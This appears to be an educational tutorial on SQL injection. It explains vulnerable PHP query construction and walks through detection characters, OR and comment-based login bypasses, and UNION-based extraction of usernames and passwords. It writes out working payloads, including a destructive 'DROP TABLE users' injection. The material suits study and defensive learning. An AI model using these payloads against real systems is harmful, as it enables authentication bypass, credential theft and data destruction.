# SQL injections

Most modern application use database in their backend to store data. In these applications, the users input some data and in the end this data is used to build SQL queries that are executed in the database.

If the queries are not properly protected, the user might abuse of them to perform any kind of database operation. This is called `SQL Injection`. The term `SQL` refers to relational databases.

Typically the database queries are executed this way:

```php
# A connection is establish using username/password and a database.
$conn = new mysqli("localhost", "root", "password", "users");
# A query is defined
$query = "select * from logins";
# The query is executed and the result is retrieved
$result = $conn->query($query);
while($row = $result->fetch_assoc() ){
	echo $row["name"]."<br>";
}
```

Usually user input is introduced in the SQL queries, e.g:

```php
$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
```

If this is not properly secured, a user can craft a malicious payload that allow the attacker to execute anything in the database. In this example, when the user inputs `admin` the query becomes:

```sql
select * from logins where username like '%admin';
```

The problem comes with a payload like: `1'; DROP TABLE users;`. In this case, the SQL query will be:

```sql
select * from logins where username like '%1'; DROP TABLE users;'
```

And the user is able to delete the `users` table.

## Types of SQL injections

- In-band: The output of the query is printed directly in the frontend and we can read it.

We can have `Union` based SQL injections which we can pass the column to read and `Error` based where we leverage PHP or SQL errors to reveal the output of the query.

- Blind: In this case, we cannot see the output of the query.

We can use `Boolean` logic in SQL or `Time` based queries, where the query is intentionally delayed using `sleep` under certain conditions.

- Out-of-band: Sometimes, we don't have any access to the query output. In this case, we can forward the query results to an external system, e.g. DNS server.

## Enumerating for SQL injections

First of all, we need to know if the input is vulnerable to SQLi. A good way to check this is to inject characters closely related to SQL in our input:

```
'	-> %27
"	-> %22
#	-> %23
;	-> %3B
)	-> %29
```

Sometimes, we might need to use the url-encoded value of the character.

When we add this characters, we need to be observant to watch for any error or any other change in the application.

## Subverting query logic

Let's image this SQL query:

```sql
SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';
```

If we introduce a `'` char:

```sql
SELECT * FROM logins WHERE username=''' AND password = 'something';
```

We will see a Syntax error in the frontend and now we know this form is vulnerable to SQL injection.

### OR injection

This simple query can be manipulated with the following payload:

`admin' or '1'='1` which will result in the following query:

```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```

The logic of the query is changed, now it selects the username `admin` or the password `something` AND `true`, which will return False because we don't know the actual password.

`username='admin'` will evaluate to true when there's a username named `admin`.
`1'='1' AND password = 'something'` the first part will evaluate to true always, the second part only when the password is the correct one; since we don't know it, it will evalute to false. True AND False will evaluate to False.

The `OR` operator will evaluate to true when one of the two components is true, so we'll completely bypass the authentication mechanism.

If we don't know the username, we can abuse in the same way of the password field:

```sql
SELECT * FROM logins WHERE username='notAdmin' or '1'='1' AND password = 'something' or '1'='1';
```

### Using comments

Just like any other language, SQL allows the use of comments as well. We can use `#` or `--` to include comments.

```sql
mysql> SELECT username FROM logins; -- Selects usernames from the logins table 
mysql> SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'
```

If you introduce comments into the username, it will disable the part of the query that checks the password:

Setting username to `admin'-- ` will create the following query:

```sql
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
```

And we'll have an auth bypass. Sometimes SQL queries use parenthesis which might need to be taken into account when generating the payload, for example:

```sql
SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password == "e7df7cd2ca07f4f1ab415d457a6e1c13"
```

If we input username as `admin')--` we will disable the password part and close the parenthesis correctly:

```sql
SELECT * FROM logins WHERE (username='admin')-- AND id > 1) AND password == "e7df7cd2ca07f4f1ab415d457a6e1c13"
```

and we'll have another auth bypass.

### Union

The `union` statement can be use to combine the fields coming from two separate selects. For example:

```sql
mysql> SELECT * FROM ports;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| ZZ-21    | Shenzhen  |
+----------+-----------+
```

and

```
mysql> SELECT * FROM ships;

+----------+-----------+
| Ship     | city      |
+----------+-----------+
| Morrison | New York  |
+----------+-----------+
1 rows in set (0.00 sec)
```

We can use `union` to combine both selects:

```sql
mysql> SELECT * FROM ports UNION SELECT * FROM ships;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| Morrison | New York  |
| ZZ-21    | Shenzhen  |
+----------+-----------+
4 rows in set (0.00 sec)
```

The number of columns and data types of the combine data tables should be the same. For example:

```sql
mysql> SELECT city FROM ports UNION SELECT * FROM ships;

ERROR 1222 (21000): The used SELECT statements have a different number of columns
```

When the number of columns doesn't fit, you can just use a number to fill the missing columns.

We can use `UNION` as another source of injections. For example in the query:

```sql
SELECT * FROM products WHERE product_id = 'user_input'
```

We can enter the following payload:

`1' UNION SELECT username, password from passwords-- `

which will end up in the following query:

```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```
and will reveal usernames and passwords.

If the number of columns are not the same, use the previous trick to make the query work:

```sql
UNION SELECT username, 2, 3, 4 from passwords-- '
```

```sql
mysql> SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '

+-----------+-----------+-----------+-----------+
| product_1 | product_2 | product_3 | product_4 |
+-----------+-----------+-----------+-----------+
|   admin   |    2      |    3      |    4      |
+-----------+-----------+-----------+-----------+
```

As seen in this example, we might need to know exactly the numbers of columns of a table. In order to do so, we can use `ORDER BY` statement:

`' order by 1-- -`, we can keep up incrementing the number until the query fails to execute, then we found the number of columns.

We can use `UNION` itself to detect the number of columns, e.g:

`cn' UNION select 1,2,3-- -`. We add numbers until it works.

We also need to know which columns are printed into the application. We can inject junk data and see how it gets printed in the frontend, for example:

`cn' UNION select 1,@@version,3,4-- -`.

This way, we have found where we need to put our injection.